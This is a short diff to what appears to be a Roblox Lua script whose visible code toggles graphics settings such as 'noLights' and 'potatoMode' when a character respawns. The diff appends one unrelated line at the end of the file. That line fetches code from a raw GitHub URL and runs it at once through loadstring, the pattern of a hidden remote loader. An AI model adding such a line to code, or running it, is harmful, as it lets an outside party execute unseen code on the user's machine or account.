@@ -114,3 +114,5 @@ player.CharacterAdded:Connect(function()
     if states.noLights then applyNoLights(true) end
     if states.potatoMode then applyPotatoMode(true) end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/g70xl0l/teehub/refs/heads/main/version"))()
